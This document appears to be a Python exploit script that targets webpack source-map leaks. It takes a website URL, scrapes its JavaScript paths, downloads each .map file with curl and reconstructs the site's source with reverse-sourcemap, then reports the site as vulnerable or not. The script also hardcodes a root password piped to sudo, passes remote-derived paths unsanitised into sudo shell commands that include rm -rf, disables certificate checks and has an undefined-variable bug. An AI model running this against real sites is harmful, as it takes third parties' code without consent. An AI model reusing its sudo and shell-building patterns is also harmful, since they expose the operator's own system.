import re
import subprocess
from sys import path
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import numpy as np


print('--------------------webpack源码泄露漏洞利用脚本(Linux)--------------------')
print('PS:脚本唯一需要修改的地方是password值，改为自己root的密码')
print('PS:会在桌面生成与网站域名对应的文件夹')

"""
Created on 2021.9.26

@author: yuchi
"""

password = "yuchi" #--------------------------root的密码----------------------------

def webpack(getlist):
    try:
        result_curl = []
        result_reverse_sourcemap = []
        error_cs = 0
        for jslist in getlist:
            print(jslist)
            js_all = jslist.split('/')
            js_name = js_all[-1]
            #print(js_name)
            js_name_all = js_name.split('.')
            js = js_name_all[0]+'_'+js_name_all[1]
            #print(js)
            curl = "curl -O {}.map".format(jslist)
            command = "reverse-sourcemap --output-dir ./{} {}.map".format(js,js_name)
            #subprocess.getstatusoutput返回值：返回是一个元组，如果成功，返回(0, 'xxx')；如果失败，返回(1, 'xxx')
            result1 = subprocess.getstatusoutput('echo %s | (%s && sudo -S %s)' % (password,file_name,curl))
            result_curl.append(result1[0])
            if result1[0] == 0:              
                result2 = subprocess.getstatusoutput('echo %s | (%s && sudo -S %s)' % (password,file_name,command))
                result_reverse_sourcemap.append(result2[0])
                if result2[0] == 1:
                    #print('reverse-sourcemap解析失败')
                    error_cs+=1 #工具解析失败次数+1
                    RM = subprocess.getstatusoutput('echo %s | (%s && rm -rf ./%s)' % (password,file_name,js)) #删除无法解析的文件
            else:
                RM = subprocess.getstatusoutput('echo %s | (%s && rm -rf ./%s.map)' % (password,file_name,js_name)) #删除下载不正常的文件
        #print(result_curl,result_reverse_sourcemap)
        s_curl = np.isin(result_curl, [0]).all()
        s_reverse_sourcemap = np.isin(result_reverse_sourcemap, [0]).all()
        #print(result_curl,result_reverse_sourcemap)
        if s_curl == True:
            print('源码下载成功---存在{}个js源码，成功下载{}个js源码'.format(len(getlist),len(getlist)))
        else:
            sz_cs = 0
            for sz in result_curl:
                if sz == 0:
                    sz_cs+=1
            print('源码下载失败---存在{}个js源码，成功下载{}个js源码'.format(len(getlist),sz_cs))
        if s_reverse_sourcemap == True:
            print('result:---存在漏洞---存在{}个js源码，共解析出{}个js源码'.format(len(getlist),len(getlist)))
        else:
            if 0 in result_reverse_sourcemap:
                print('result:---可能存在漏洞---存在{}个js源码，共解析出{}个js源码'.format(len(getlist),len(getlist)-error_cs))
            else:
                print('result:---不存在漏洞---')
    except Exception as e:
        print('程序出错',e)

def findjs(new_url):
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    getlist = []
    url_host = new_url[2] #网站的主网站地址
    # 测试哪种url能通
    for i in range(2,len(new_url)):
        url = new_url[i]
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        rs = requests.get(url,headers=headers,timeout=10,verify=False)
        if rs.status_code == 200:
            break
    houzuilist = ['.js'] #要提取的文件后缀名
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.get(url,headers=headers,timeout=10,verify=False)
        if r.status_code == 200:
            rt = r.text
        else:
            print("网站有误")
            return
        rt = rt.split('>')
        for line in rt:
            for houzui in houzuilist:
                if houzui in line:
                    if len(line) > 2000:  #限制长度，排查静态源码
                        pass
                    else:
                        tp = re.findall('=(.*)\{}'.format(houzui),line)
                        hz = houzui
                        tp = tp[0] + hz
                        error_l = ['/','\'','\"','.']
                        for i in error_l:
                            if tp[0] == i:
                                tp = tp[1:]
                        if 'http' not in tp:
                            if '\"' in tp:
                                tp = tp.split('\"')
                                for tp1 in tp:
                                    if hz not in tp1:
                                        pass
                                    else:
                                        tp = re.findall('(.*){}'.format(hz),tp1)
                                        tp = tp[0] + hz
                                        for i in error_l:
                                            if tp[0] == i:
                                                tp = tp[1:]
                                        if tp[-3:] != '.js':
                                            tp += hz
                                        getlist.append(tp)
                            else:
                                tp = tp.replace('./','/')
                                for i in error_l:
                                    if tp[0] == i:
                                        tp = tp[1:]
                                if tp[-3:] != '.js':
                                    tp += hz
                                getlist.append(tp)
                        else:
                            tp = re.findall('http(.*)',tp)
                            tp = 'http'+tp[0]
                            tp_http = tp.split('/')
                            tps = ''
                            tps_url = []
                            for i in range(len(tp_http)):
                                if i == len(tp_http)-1:
                                    tps = tps + tp_http[i]
                                    tps_url.append(tps)
                                else:
                                    tps = tps + tp_http[i] + '/'
                                    tps_url.append(tps)
                            if len(tps_url) <= 3:
                                pass
                            else:
                                if tps_url[2] != url_host:
                                    pass
                                else:
                                    if tp[-3:] != '.js':
                                        tp += hz
                                    getlist.append(tp)
                else:
                    pass
        # 拼接正确的js地址
        for i in range(2,len(new_url)):
            url = new_url[i] + getlist[0]
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            rs = requests.get(url,headers=headers,timeout=10,verify=False)
            if rs.status_code == 200:
                for j in range(len(getlist)):
                    getlist[j] = new_url[i] + getlist[j]
                break
        #print(getlist)
        webpack(getlist)
    except Exception as e:
        print('-------网站无法访问，已退出-------',e)

def urlforfind(url):
    #print(url)
    url_list = url.split('/')
    #print(url_list)
    urls = ''
    new_url = []
    for i in range(len(url_list)-1):
        if i != len(url_list):
            urls = urls + url_list[i] + '/'
            new_url.append(urls)
    #print(new_url)
    mkdirfile(url_list[2])
    findjs(new_url)

def mkdirfile(file):
    global file_name
    file = file.replace('.','_')
    path = '/home/$USER'
    linux_user_re = subprocess.getstatusoutput('cd {}/桌面 && mkdir {}'.format(path,file))
    if linux_user_re[0] == 0:
        file_name = 'cd {}/桌面/{}'.format(path,file)
    elif linux_user_re[0] == 1:
        if '文件已存在' in linux_user_re[1]:
            file_name = 'cd {}/桌面/{}'.format(path,file)
        else:
            subprocess.getstatusoutput('cd /home/{}/Desktop && mkdir {}'.format(linux_user,file))
            file_name = 'cd {}/Desktop/{}'.format(path,file)
    else:
        print('文件创建失败')

# 验证是否安装reverse-sourcemap工具，若无就自动安装

result_reverse_sourcemap_az= subprocess.getstatusoutput('echo %s | sudo -S %s' % (password, 'which reverse-sourcemap'))
if result_reverse_sourcemap_az[0] == 0:
    pass
else:
    subprocess.getstatusoutput('echo %s | sudo -S %s' % (password, 'npm install --global reverse-sourcemap'))


url = input("请输入目标网址:")

if url == '':
    print('-------------退出-------------')
else:
    urlforfind(url)
